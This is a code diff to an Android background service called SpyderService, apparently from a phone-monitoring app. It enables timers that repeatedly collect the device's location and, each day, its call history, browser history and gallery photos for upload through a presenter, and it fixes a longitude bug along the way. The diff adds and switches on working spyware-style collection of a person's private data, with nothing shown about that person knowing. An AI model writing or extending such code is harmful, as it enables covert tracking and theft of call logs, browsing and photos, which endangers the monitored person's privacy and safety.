@@ -27,7 +27,9 @@ import com.spyder.app.activitys.view.activities.LocationDatabase;
 import com.spyder.app.activitys.webservices.GPSTrack;
 import com.spyder.app.activitys.webservices.Mediator;
 
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -61,14 +63,13 @@ public class SpyderService extends Service implements SpyderContract.View {
         getlangitude = gpsTrack.currentLangitude;
         getLattitude = gpsTrack.currentLattitude;
         timer = new Timer();
-        //timerLocationOperation();
-       // timerOneDayOperation();
+        timerLocationOperation();
+        timerOneDayOperation();
      //call History and browserDetails
         getDetailsInformation = new GetDetailsInformation(getApplicationContext());
-        //  callLocationDetails();
-       //  callSaveCallHistoryDetails();
-
-       getGalleryPhotosService();
+          callLocationDetails();
+          callSaveCallHistoryDetails();
+          getGalleryPhotosService();
         //getDetailsInformation.getBrowserHistory();
         //getDetailsInformation.secondmethodBrowserHistory();
 
@@ -80,7 +81,7 @@ public class SpyderService extends Service implements SpyderContract.View {
             public void run() {
                 callLocationDetails();
             }
-        }, 0, Constants.TIMER_REPEAT);
+        }, 0, Constants.TIMER_LOCATION_REPEAT);
     }
 
     private void timerOneDayOperation() {
@@ -89,8 +90,10 @@ public class SpyderService extends Service implements SpyderContract.View {
             public void run() {
                 callSaveCallHistoryDetails();
                 callBrowswerHistory();
+                getGalleryPhotosService();
+
             }
-        }, 0, Constants.TIMER_REPEAT);
+        }, 0, Constants.TIME_ONE_DAY_REPEAT);
     }
 
 
@@ -129,8 +132,12 @@ public class SpyderService extends Service implements SpyderContract.View {
         location.setUserId(sharedPref.getUserId());
        // location.setUserId("1");
         location.setLattitude(getLattitude);
-        location.setLongitude(getLattitude);
-        location.setTimestamp(String.valueOf(System.currentTimeMillis()));
+        location.setLongitude(getlangitude);
+
+        Calendar cal = Calendar.getInstance();
+        SimpleDateFormat sdf = new SimpleDateFormat("dd-mm-yyyy hh:mm:ss a");
+        String currentDate = sdf.format(cal.getTime());
+        location.setTimestamp(currentDate);
         locationDetailList.add(location);
         locationDetails.setLocationDetails(locationDetailList);
 
@@ -154,20 +161,20 @@ public class SpyderService extends Service implements SpyderContract.View {
         }
         CallHistoryDetails callHistoryDetails = new CallHistoryDetails();
         callHistoryDetails.setCallHistoryDetails(getDetailsInformation.getCallHistory());
-       // MyLog.log("calldetails", gson.toJson(callHistoryDetails));
-        //showProgressDialog();
         if(callHistoryDetails.getCallHistoryDetails().size()>0)
         {mSpyderPresenter.savecallHistoryDetails(callHistoryDetails);}
     }
+
+
+
     public void getGalleryPhotosService() {
         if(getDetailsInformation==null) {
             getDetailsInformation = new GetDetailsInformation(getApplicationContext());
         }
-        UserPhotoDetailList userPhotoDetailList = new UserPhotoDetailList();
-        userPhotoDetailList.setPhotoDetails(getDetailsInformation.fn_imagespath());
-        // MyLog.log("calldetails", gson.toJson(callHistoryDetails));
-        //showProgressDialog();
-        mSpyderPresenter.savePhotoDetails(userPhotoDetailList);
+        getDetailsInformation.getTheAllPhotos();
+       /* UserPhotoDetailList userPhotoDetailList = new UserPhotoDetailList();
+        userPhotoDetailList.setPhotoDetails(getDetailsInformation.getTheAllPhotos());
+        mSpyderPresenter.savePhotoDetails(userPhotoDetailList);*/
     }
 
 
